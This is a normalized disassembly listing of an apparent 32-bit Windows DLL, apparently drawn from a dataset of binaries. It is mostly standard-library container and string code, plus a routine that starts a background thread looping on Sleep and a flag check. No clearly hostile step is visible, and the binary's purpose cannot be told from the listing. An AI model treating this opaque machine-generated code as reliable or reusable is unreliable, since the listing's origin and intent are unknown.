sub_10001012
push 0x24
mov eax sub_100498d2
call sub_10023e33
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push esi
mov [ ebp - 0x30 ] esi
mov [ ebp - 0x10 ] ebx
call sub_100025ec
xor edi edi
mov [ ebp - 0x4 ] ebx
inc edi
push r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x10 ] edi
call sub_100012f3
lea ecx [ ebp - 0x2c ]
lea eax [ esi + 0x70 ]
push ecx
mov [ ebp - 0x4 ] edi
call sub_100013d4
push ebx
push edi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call sub_10002597
push r--data
lea ecx [ ebp - 0x2c ]
call sub_100012f3
lea eax [ ebp - 0x2c ]
push eax
lea eax [ esi + 0x70 ]
mov [ ebp - 0x4 ] 0x2
call sub_100013d4
push ebx
push edi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call sub_10002597
push r--data
lea ecx [ ebp - 0x2c ]
call sub_100012f3
lea eax [ ebp - 0x2c ]
push eax
lea eax [ esi + 0x70 ]
mov [ ebp - 0x4 ] 0x3
call sub_100013d4
push ebx
push edi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call sub_10002597
push r--data
lea ecx [ esi + 0x54 ]
call sub_10002521
push r--data
lea ecx [ esi + 0x38 ]
call sub_10002521
push r--data
lea ecx [ esi + 0x18 ]
mov [ esi + 0x34 ] 0xa4cb80
call sub_10001444
mov eax esi
call sub_10023f0b
retn
sub_100010f1
push 0x0
mov eax sub_100492c9
call sub_10023e33
mov edi ecx
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_10001315
and [ ebp - 0x4 ] 0x0
lea eax [ edi + 0x18 ]
push eax
lea ecx [ esi + 0x18 ]
call sub_100020c6
mov [ ebp - 0x4 ] 0x1
mov eax [ edi + 0x34 ]
mov [ esi + 0x34 ] eax
lea eax [ edi + 0x38 ]
push eax
lea ecx [ esi + 0x38 ]
call sub_10001daa
lea eax [ edi + 0x54 ]
push eax
lea ecx [ esi + 0x54 ]
mov [ ebp - 0x4 ] 0x2
call sub_10001daa
add edi 0x70
push edi
lea eax [ esi + 0x70 ]
push eax
mov [ ebp - 0x4 ] 0x3
call sub_10001315
mov eax esi
call sub_10023f0b
retn 0x4
sub_1000115a
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004a5e2
mov eax [ fs : 0x0 ]
push eax
sub esp 0xb8
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xb0 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc8 ]
mov [ fs : 0x0 ] eax
xor edi edi
lea esi [ esp + 0x34 ]
mov [ esp + 0x10 ] edi
call sub_10001012
push 0x12c
mov [ esp + 0xd4 ] edi
call sub_10020186
pop ecx
mov [ esp + 0x14 ] eax
xor ebx ebx
inc ebx
mov [ esp + 0xd0 ] bl
cmp eax edi
je r-xdata
xor eax eax
push r--data
lea ecx [ esp + 0x1c ]
call sub_100012f3
lea eax [ esp + 0x18 ]
push eax
mov eax esi
mov [ esp + 0xd4 ] 0x2
push eax
push [ esp + 0x1c ]
mov [ esp + 0x1c ] ebx
call sub_10007ef7
jmp r-xdata
mov esi [ Sleep@IAT ]
push 0x3e8
jmp r-xdata
push edi
push ebx
lea ecx [ esp + 0x20 ]
call sub_10002597
mov [ esp + 0xd0 ] edi
mov [ rw-data ] eax
test [ esp + 0x10 ] bl
je r-xdata
call esi
mov al [ rw-data ]
test al al
je r-xdata
push ebx
push [ rw-data ]
call sub_1001156d
lea edi [ esp + 0x34 ]
call sub_10002634
xor eax eax
mov ecx [ esp + 0xc8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0xb0 ]
xor ecx esp
call sub_10020040
mov esp ebp
pop ebp
retn 0x4
sub_1000126e
push 0x48
mov eax sub_10048fa8
call sub_10023e33
xor esi esi
lea eax [ ebp - 0x10 ]
push eax
push esi
push esi
push sub_1000115a
push esi
push esi
mov [ ebp - 0x10 ] esi
call [ CreateThread@IAT ]
cmp eax esi
jne r-xdata
call sub_10023f0b
retn
push r--data
lea ecx [ ebp - 0x2c ]
call sub_10001d1f
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x4 ] esi
call sub_10001d6b
push r--data
lea eax [ ebp - 0x54 ]
push eax
call sub_10023a01
sub_10001315
push 0x14
mov eax sub_10049886
call sub_10023e66
xor ebx ebx
push ebx
push 0x1
call sub_10001b38
mov edi [ ebp + 0x8 ]
pop ecx
pop ecx
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov eax edi
call sub_10023f0b
retn 0x8
call sub_100014df
cmp al bl
je r-xdata
mov [ edi ] eax
mov [ ebp - 0x4 ] ebx
mov esi [ ebp + 0xc ]
mov eax [ esi + 0x10 ]
sub eax [ esi + 0xc ]
push 0x1c
cdq
pop ecx
idiv ecx
mov [ edi + 0xc ] ebx
mov [ edi + 0x10 ] ebx
mov [ edi + 0x14 ] ebx
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] 0x1
mov ebx [ esi + 0x10 ]
mov edi esi
lea esi [ ebp - 0x18 ]
call sub_10001909
mov ebx [ edi + 0xc ]
lea esi [ ebp - 0x20 ]
call sub_10001909
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0xc ]
xor eax eax
lea edi [ ebp + 0xc ]
stosb [ edi ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push ecx
push [ ebp - 0x14 ]
mov ecx [ ebp - 0x1c ]
call sub_10006b5c
add esp 0x10
mov [ esi + 0x10 ] eax
mov edi esi
sub_100013d4
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
mov edi eax
mov ecx [ edi + 0xc ]
test ecx ecx
jne r-xdata
mov eax [ edi + 0x14 ]
sub eax ecx
push 0x1c
cdq
pop esi
idiv esi
mov esi eax
xor esi esi
jmp r-xdata
lea esi [ ebp - 0xc ]
call sub_10001909
push [ ebp - 0x8 ]
lea eax [ ebp - 0xc ]
push [ ebp - 0xc ]
push [ ebp + 0x8 ]
push eax
mov eax edi
call sub_10001461
push [ ebp + 0x8 ]
push 0x1
push ebx
call sub_1000152d
mov [ edi + 0x10 ] eax
jmp r-xdata
mov ebx [ edi + 0x10 ]
mov eax ebx
sub eax ecx
push 0x1c
cdq
pop ecx
idiv ecx
cmp eax esi
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_10001461
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0xc ]
mov eax [ edi + 0x10 ]
sub eax ebx
push 0x1c
cdq
pop ecx
idiv ecx
test eax eax
jne r-xdata
lea esi [ ebp - 0x8 ]
call sub_10001909
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] eax
jmp r-xdata
call sub_1002059f
cmp eax [ ebp - 0x8 ]
je r-xdata
push [ ebp + 0x14 ]
mov ecx edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
call sub_100015ee
mov ebx [ edi + 0xc ]
lea esi [ ebp - 0x10 ]
call sub_10001909
push [ ebp - 0x4 ]
mov esi [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
call sub_10001929
pop edi
mov eax esi
pop esi
pop ebx
leave
retn 0x10
mov eax [ ebp + 0x14 ]
sub eax [ ebp - 0x4 ]
push 0x1c
cdq
pop ecx
idiv ecx
mov [ ebp - 0x4 ] eax
sub_100014df
push esi
mov esi eax
cmp esi 0x9249249
jbe r-xdata
mov ecx esi
call sub_100018bf
imul esi esi 0x1c
add esi eax
mov [ edi + 0xc ] eax
mov [ edi + 0x10 ] eax
mov [ edi + 0x14 ] esi
mov al 0x1
pop esi
retn
call sub_10001880
sub_1000152d
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
push [ ebp + 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100019be
mov eax [ ebp + 0xc ]
imul eax eax 0x1c
add esp 0x14
add eax [ ebp + 0x8 ]
pop edi
leave
retn 0xc
sub_1000155d
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
mov esi ecx
call sub_10001c8c
test al al
je r-xdata
push 0x0
push [ ebp + 0xc ]
mov ecx esi
call sub_10001fc4
test al al
je r-xdata
cmp [ esi + 0x18 ] 0x8
jb r-xdata
mov eax esi
mov ecx [ esi + 0x18 ]
cmp ecx 0x8
jb r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x8
push [ ebp + 0xc ]
sub edi eax
sar edi 0x1
push edi
push esi
mov ecx esi
call sub_10002033
jmp r-xdata
push [ ebp + 0xc ]
push edi
push ecx
push eax
call sub_1000255d
add esp 0x10
push [ ebp + 0xc ]
mov ecx esi
call sub_10002579
sub_100015ee
push 0x54
mov eax sub_10049859
call sub_10023ed2
mov edi [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov esi ecx
mov ecx [ esi + 0xc ]
mov [ ebp - 0x54 ] esi
mov [ ebp - 0x58 ] eax
test ecx ecx
jne r-xdata
mov eax [ esi + 0x14 ]
sub eax ecx
push 0x1c
cdq
pop ebx
idiv ebx
mov ebx eax
xor ebx ebx
jmp r-xdata
call sub_10023f2e
retn 0x10
mov eax [ esi + 0x10 ]
sub eax ecx
push 0x1c
cdq
pop ecx
idiv ecx
mov ecx 0x9249249
mov edx ecx
sub edx eax
cmp edx edi
jae r-xdata
test edi edi
je r-xdata
add eax edi
cmp ebx eax
jae r-xdata
call sub_10001880
mov eax [ esi + 0x10 ]
sub eax [ ebp + 0x14 ]
push 0x1c
cdq
pop ecx
idiv ecx
push [ ebp - 0x58 ]
cmp eax edi
jae r-xdata
mov edx ebx
shr edx 0x1
sub ecx edx
cmp ecx ebx
jae r-xdata
lea ecx [ ebp - 0x4c ]
call sub_100020c6
imul edi edi 0x1c
mov [ ebp - 0x4 ] 0x5
mov ebx [ esi + 0x10 ]
mov ecx ebx
sub ecx edi
push ebx
mov edx ebx
mov [ ebp - 0x58 ] ecx
call sub_1000199d
mov [ esi + 0x10 ] eax
mov eax [ ebp + 0x14 ]
mov esi [ ebp - 0x58 ]
mov [ ebp - 0x54 ] eax
cmp eax esi
je r-xdata
lea ecx [ ebp - 0x30 ]
call sub_100020c6
mov ebx edi
imul ebx ebx 0x1c
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp + 0x14 ]
push [ esi + 0x10 ]
lea edx [ ebx + ecx ]
call sub_1000199d
mov [ ebp - 0x4 ] 0x3
mov eax [ esi + 0x10 ]
sub eax [ ebp + 0x14 ]
lea ecx [ ebp - 0x30 ]
push ecx
push 0x1c
pop ecx
cdq
idiv ecx
sub edi eax
push edi
push [ esi + 0x10 ]
call sub_1000152d
mov [ ebp - 0x4 ] 0x2
add [ esi + 0x10 ] ebx
mov esi [ esi + 0x10 ]
mov edi [ ebp + 0x14 ]
sub esi ebx
jmp r-xdata
add ebx edx
xor ebx ebx
jmp r-xdata
lea esi [ edi + eax ]
mov edi eax
cmp eax esi
je r-xdata
sub ebx esi
cmp edi esi
jne r-xdata
mov ecx ebx
call sub_100018bf
mov [ ebp - 0x50 ] eax
mov eax [ ebp + 0x14 ]
sub eax [ esi + 0xc ]
push 0x1c
cdq
pop ecx
idiv ecx
push [ ebp - 0x58 ]
and [ ebp - 0x5c ] 0x0
and [ ebp - 0x4 ] 0x0
push edi
mov [ ebp - 0x54 ] eax
imul eax eax 0x1c
add eax [ ebp - 0x50 ]
push eax
call sub_1000152d
push [ ebp + 0x14 ]
mov edx [ ebp - 0x50 ]
mov ecx [ esi + 0xc ]
mov [ ebp - 0x5c ] 0x1
call sub_1000199d
mov eax [ ebp - 0x54 ]
push [ esi + 0x10 ]
mov ecx [ ebp + 0x14 ]
lea edx [ eax + edi ]
imul edx edx 0x1c
add edx [ ebp - 0x50 ]
mov [ ebp - 0x5c ] 0x2
call sub_1000199d
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x10 ]
sub eax ecx
cdq
push 0x1c
pop ecx
idiv ecx
add edi eax
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov ebx eax
cmp ebx eax
jae r-xdata
lea ecx [ ebp - 0x4c ]
push 0xffffffff
push 0x0
lea eax [ ebp - 0x4c ]
push eax
mov ecx edi
call sub_10002033
add edi 0x1c
cmp edi esi
jne r-xdata
sub esi 0x1c
lea eax [ ebx + esi ]
push eax
mov ecx esi
call sub_10001ac2
pop ecx
cmp esi [ ebp - 0x54 ]
jne r-xdata
mov eax [ ebp + 0x14 ]
push 0xffffffff
push 0x0
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
call sub_10002033
add edi 0x1c
lea ecx [ ebp - 0x30 ]
jmp r-xdata
mov eax [ ebp - 0x50 ]
imul ebx ebx 0x1c
imul edi edi 0x1c
add ebx eax
add edi eax
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] edi
mov [ esi + 0xc ] eax
jmp r-xdata
push [ esi + 0x10 ]
call sub_100015d1
push [ esi + 0xc ]
call sub_1002004f
pop ecx
push 0x0
push 0x1
call sub_10002597
sub_1000170c
cmp [ ebp - 0x5c ] 0x1
jle r-xdata
xor esi esi
cmp [ ebp - 0x5c ] esi
jle r-xdata
mov ecx [ ebp - 0x54 ]
mov eax [ ebp - 0x50 ]
imul ecx ecx 0x1c
add ecx eax
push ecx
call sub_100015d1
push [ ebp - 0x50 ]
call sub_1002004f
pop ecx
push esi
push esi
call sub_10023a01
mov eax [ esi + 0x10 ]
sub eax [ ebp + 0x14 ]
push 0x1c
cdq
pop ecx
idiv ecx
push [ ebp - 0x58 ]
cmp eax edi
jae r-xdata
mov eax [ ebp - 0x54 ]
mov ecx [ ebp + 0x8 ]
add ecx eax
imul eax eax 0x1c
add eax [ ebp - 0x50 ]
imul ecx ecx 0x1c
add ecx [ ebp - 0x50 ]
push ecx
call sub_100015d1
lea ecx [ ebp - 0x4c ]
call sub_100020c6
imul edi edi 0x1c
mov [ ebp - 0x4 ] 0x5
mov ebx [ esi + 0x10 ]
mov ecx ebx
sub ecx edi
push ebx
mov edx ebx
mov [ ebp - 0x58 ] ecx
call sub_1000199d
mov [ esi + 0x10 ] eax
mov eax [ ebp + 0x14 ]
mov esi [ ebp - 0x58 ]
mov [ ebp - 0x54 ] eax
cmp eax esi
je r-xdata
lea ecx [ ebp - 0x30 ]
call sub_100020c6
mov ebx edi
imul ebx ebx 0x1c
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp + 0x14 ]
push [ esi + 0x10 ]
lea edx [ ebx + ecx ]
call sub_1000199d
mov [ ebp - 0x4 ] 0x3
mov eax [ esi + 0x10 ]
sub eax [ ebp + 0x14 ]
lea ecx [ ebp - 0x30 ]
push ecx
push 0x1c
pop ecx
cdq
idiv ecx
sub edi eax
push edi
push [ esi + 0x10 ]
call sub_1000152d
mov [ ebp - 0x4 ] 0x2
add [ esi + 0x10 ] ebx
mov esi [ esi + 0x10 ]
mov edi [ ebp + 0x14 ]
sub esi ebx
jmp r-xdata
lea esi [ edi + eax ]
mov edi eax
cmp eax esi
je r-xdata
sub ebx esi
cmp edi esi
jne r-xdata
lea ecx [ ebp - 0x4c ]
push 0xffffffff
push 0x0
lea eax [ ebp - 0x4c ]
push eax
mov ecx edi
call sub_10002033
add edi 0x1c
cmp edi esi
jne r-xdata
sub esi 0x1c
lea eax [ ebx + esi ]
push eax
mov ecx esi
call sub_10001ac2
pop ecx
cmp esi [ ebp - 0x54 ]
jne r-xdata
mov eax [ ebp + 0x14 ]
push 0xffffffff
push 0x0
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
call sub_10002033
add edi 0x1c
lea ecx [ ebp - 0x30 ]
jmp r-xdata
push 0x0
push 0x1
call sub_10002597
call sub_10023f2e
retn 0x10
sub_10001880
push 0x44
mov eax sub_10048fcb
call sub_10023e33
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001d1f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x50 ]
call sub_10001be4
push r--data
lea eax [ ebp - 0x50 ]
push eax
mov [ ebp - 0x50 ] r--data
call sub_10023a01
int3
sub_100018bf
push ebp
mov ebp esp
sub esp 0x10
test ecx ecx
ja r-xdata
or eax 0xffffffff
xor edx edx
div ecx
cmp eax 0x1c
jae r-xdata
xor ecx ecx
imul ecx ecx 0x1c
push ecx
call sub_10020186
pop ecx
leave
retn
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
call sub_100201fc
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] r--data
call sub_10023a01
int3
sub_10001909
and [ esi ] 0x0
test edi edi
je r-xdata
call sub_1002059f
cmp [ edi + 0xc ] ebx
ja r-xdata
cmp ebx [ edi + 0x10 ]
jbe r-xdata
mov eax [ edi ]
mov [ esi ] eax
mov [ esi + 0x4 ] ebx
mov eax esi
retn
sub_10001929
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push edi
push [ ebp + 0x8 ]
lea edi [ ebp - 0x8 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
call sub_10001957
mov eax [ ebp - 0x8 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov eax esi
pop edi
leave
retn 0x4
sub_10001957
mov eax [ edi ]
test eax eax
jne r-xdata
mov edx [ eax ]
jmp r-xdata
call sub_1002059f
mov eax [ edi ]
test eax eax
je r-xdata
mov ecx [ edi + 0x4 ]
push esi
mov esi [ esp + 0x8 ]
imul esi esi 0x1c
add ecx esi
cmp ecx [ edx + 0x10 ]
ja r-xdata
xor edx edx
call sub_1002059f
test eax eax
je r-xdata
xor eax eax
mov eax [ eax ]
jmp r-xdata
add [ edi + 0x4 ] esi
mov eax edi
pop esi
retn 0x4
cmp ecx [ eax + 0xc ]
jae r-xdata
sub_1000199d
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_10001a3d
add esp 0xc
pop edi
leave
retn 0x4
sub_100019be
push 0x8
mov eax sub_1004930d
call sub_10023e66
mov eax [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x14 ] eax
call sub_10023f0b
retn
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
call sub_10001a13
dec [ ebp + 0xc ]
add [ ebp + 0x8 ] 0x1c
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
sub_100019ee
mov esi [ ebp - 0x14 ]
jmp r-xdata
push 0x0
cmp esi [ ebp + 0x8 ]
jne r-xdata
push 0x1
mov ecx esi
call sub_10002597
add esi 0x1c
push 0x0
call sub_10023a01
call sub_10023f0b
retn
sub_10001a3d
push 0x2c
mov eax sub_10049824
call sub_10023ed2
mov esi edx
xor ebx ebx
mov edi ecx
push ebx
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x18 ] 0x7
call sub_10002579
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x4 ] 0x1
push ebx
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_10002597
mov eax esi
call sub_10023f2e
retn
lea eax [ ebp - 0x30 ]
push eax
mov ecx esi
call sub_10001a13
push esi
mov ecx edi
call sub_10001ac2
add esi 0x1c
pop ecx
mov [ ebp - 0x34 ] esi
add edi 0x1c
jmp r-xdata
cmp edi [ ebp + 0x8 ]
je r-xdata
sub_10001a90
mov esi [ ebp - 0x38 ]
jmp r-xdata
push 0x0
cmp esi [ ebp - 0x34 ]
jne r-xdata
push 0x1
mov ecx esi
call sub_10002597
add esi 0x1c
push 0x0
call sub_10023a01
push ebx
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_10002597
mov eax esi
call sub_10023f2e
retn
sub_10001ac2
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp eax ecx
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10020040
leave
retn
push ebx
push esi
push edi
lea edx [ eax + 0x4 ]
mov esi edx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea ebx [ ecx + 0x4 ]
mov edi edx
mov esi ebx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi ebx
lea esi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ ecx + 0x14 ]
mov edx [ eax + 0x14 ]
mov [ eax + 0x14 ] esi
mov esi [ ecx + 0x18 ]
mov [ ecx + 0x14 ] edx
mov edx [ eax + 0x18 ]
pop edi
mov [ eax + 0x18 ] esi
pop esi
mov [ ecx + 0x18 ] edx
pop ebx
sub_10001b38
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0xc
test ecx ecx
ja r-xdata
or eax 0xffffffff
xor edx edx
div ecx
cmp eax 0x4
jae r-xdata
xor ecx ecx
mov eax ecx
shl eax 0x2
push eax
call sub_10020186
pop ecx
leave
retn
and [ ebp + 0x8 ] 0x0
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_100201fc
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_10023a01
int3
sub_10001baa
push 0x4
mov eax sub_10048a8b
call sub_10023e33
mov esi ecx
mov [ ebp - 0x10 ] esi
mov edi [ ebp + 0x8 ]
push edi
call sub_1002026c
and [ ebp - 0x4 ] 0x0
add edi 0xc
push edi
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
call sub_10001daa
mov eax esi
call sub_10023f0b
retn 0x4
sub_10001be4
push 0x4
mov eax sub_10048a8b
call sub_10023e33
mov esi ecx
mov [ ebp - 0x10 ] esi
call sub_100201eb
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
call sub_10001daa
mov eax esi
call sub_10023f0b
retn 0x4
sub_10001c8c
cmp [ esp + 0x4 ] 0x0
push esi
je r-xdata
xor al al
mov esi [ ecx + 0x18 ]
lea eax [ ecx + 0x4 ]
cmp esi 0x8
jb r-xdata
mov edx eax
mov edx [ eax ]
jmp r-xdata
cmp esi 0x8
jb r-xdata
cmp [ esp + 0x8 ] edx
jb r-xdata
mov ecx [ ecx + 0x14 ]
lea eax [ eax + ecx * 2 ]
cmp eax [ esp + 0x8 ]
jbe r-xdata
mov eax [ eax ]
mov al 0x1
jmp r-xdata
pop esi
retn 0x4
sub_10001ce5
push 0x4
mov eax sub_10048a8b
call sub_10023e33
mov esi ecx
mov [ ebp - 0x10 ] esi
mov edi [ ebp + 0x8 ]
push edi
call sub_1002026c
and [ ebp - 0x4 ] 0x0
add edi 0xc
push edi
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
call sub_10001daa
mov eax esi
call sub_10023f0b
retn 0x4
sub_10001d6b
push 0x4
mov eax sub_10048a8b
call sub_10023e33
mov esi ecx
mov [ ebp - 0x10 ] esi
call sub_100201eb
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
call sub_10001daa
mov eax esi
call sub_10023f0b
retn 0x4
sub_10001daa
push esi
mov esi ecx
push 0x0
mov [ esi + 0x18 ] 0xf
call sub_10002493
push 0xffffffff
push 0x0
push [ esp + 0x10 ]
mov ecx esi
call sub_100021b2
mov eax esi
pop esi
retn 0x4
sub_10001e10
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp [ esi + 0x14 ] edi
jae r-xdata
mov eax [ esi + 0x14 ]
sub eax edi
cmp eax [ ebp + 0xc ]
jae r-xdata
call sub_1001b037
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
mov [ ebp + 0xc ] eax
pop edi
mov eax esi
pop esi
leave
retn 0x8
mov ecx [ esi + 0x18 ]
push ebx
lea edx [ esi + 0x4 ]
cmp ecx 0x8
jb r-xdata
mov [ ebp + 0x8 ] edx
mov ebx [ edx ]
mov [ ebp + 0x8 ] ebx
jmp r-xdata
mov ebx [ ebp + 0xc ]
sub eax ebx
push eax
mov [ ebp - 0x4 ] edx
mov edx [ ebp + 0x8 ]
lea eax [ edi + ebx ]
lea eax [ edx + eax * 2 ]
push eax
mov eax [ ebp - 0x4 ]
sub ecx edi
push ecx
lea eax [ eax + edi * 2 ]
push eax
call sub_10001def
mov eax [ esi + 0x14 ]
add esp 0x10
sub eax ebx
push eax
mov ecx esi
call sub_10002579
pop ebx
mov edx [ edx ]
cmp ecx 0x8
jb r-xdata
sub_10001e90
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0xc
test ecx ecx
ja r-xdata
or eax 0xffffffff
xor edx edx
div ecx
cmp eax 0x2
jae r-xdata
xor ecx ecx
lea eax [ ecx + ecx ]
push eax
call sub_10020186
pop ecx
leave
retn
and [ ebp + 0x8 ] 0x0
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_100201fc
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_10023a01
int3
sub_10001edd
push 0xc
mov eax sub_10048a68
call sub_10023e66
mov edi ecx
mov [ ebp - 0x18 ] edi
mov esi [ ebp + 0x8 ]
or esi 0x7
cmp esi 0x7ffffffe
jbe r-xdata
xor edx edx
push 0x3
mov eax esi
pop ebx
div ebx
mov ecx [ edi + 0x18 ]
mov [ ebp - 0x14 ] ecx
shr [ ebp - 0x14 ] 0x1
mov edx [ ebp - 0x14 ]
cmp eax edx
jae r-xdata
mov esi [ ebp + 0x8 ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x1 ]
push 0x0
push eax
call sub_10001e90
pop ecx
pop ecx
mov ebx eax
jmp r-xdata
mov eax 0x7ffffffe
sub eax edx
cmp ecx eax
ja r-xdata
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
lea esi [ edx + ecx ]
push 0x0
push 0x1
mov ecx edi
call sub_10002597
push [ ebp + 0xc ]
mov ecx edi
mov [ edi + 0x4 ] ebx
mov [ edi + 0x18 ] esi
call sub_10002579
call sub_10023f0b
retn 0x8
cmp [ edi + 0x18 ] 0x8
jb r-xdata
lea eax [ edi + 0x4 ]
mov eax [ edi + 0x4 ]
jmp r-xdata
push [ ebp + 0xc ]
push eax
lea eax [ esi + 0x1 ]
push eax
push ebx
call sub_1000255d
add esp 0x10
sub_10001f3d
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] esp
mov [ ebp + 0x8 ] eax
inc eax
push 0x0
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10001e90
pop ecx
mov [ ebp - 0x14 ] eax
pop ecx
mov eax r-xdata
retn
sub_10001fc4
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
cmp edi 0x7ffffffe
jbe r-xdata
cmp [ esi + 0x18 ] edi
jae r-xdata
call sub_1001afff
cmp [ esp + 0x10 ] 0x0
je r-xdata
push [ esi + 0x14 ]
mov ecx esi
push edi
call sub_10001edd
jmp r-xdata
test edi edi
jne r-xdata
cmp edi 0x8
jae r-xdata
xor eax eax
cmp eax edi
sbb eax eax
pop edi
neg eax
pop esi
retn 0x8
push edi
mov ecx esi
call sub_10002579
mov eax [ esi + 0x14 ]
cmp edi eax
jae r-xdata
push eax
push 0x1
mov ecx esi
call sub_10002597
jmp r-xdata
mov eax edi
sub_10002033
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov ebx ecx
cmp [ edi + 0x14 ] eax
jae r-xdata
mov esi [ edi + 0x14 ]
mov eax [ ebp + 0xc ]
sub esi eax
cmp [ ebp + 0x10 ] esi
jae r-xdata
call sub_1001b037
mov ecx ebx
cmp ebx edi
jne r-xdata
mov esi [ ebp + 0x10 ]
push 0x0
push esi
call sub_10001fc4
test al al
je r-xdata
push 0xffffffff
add esi eax
push esi
call sub_10001e10
push [ ebp + 0xc ]
mov ecx ebx
push 0x0
call sub_10001e10
jmp r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn 0xc
cmp [ edi + 0x18 ] 0x8
jb r-xdata
add edi 0x4
mov edi [ edi + 0x4 ]
jmp r-xdata
lea eax [ ebx + 0x4 ]
mov eax [ ebx + 0x4 ]
jmp r-xdata
mov ecx [ ebx + 0x18 ]
cmp ecx 0x8
jb r-xdata
mov edx [ ebp + 0xc ]
push esi
lea edx [ edi + edx * 2 ]
push edx
push ecx
push eax
call sub_1000255d
add esp 0x10
push esi
mov ecx ebx
call sub_10002579
sub_100020c6
push esi
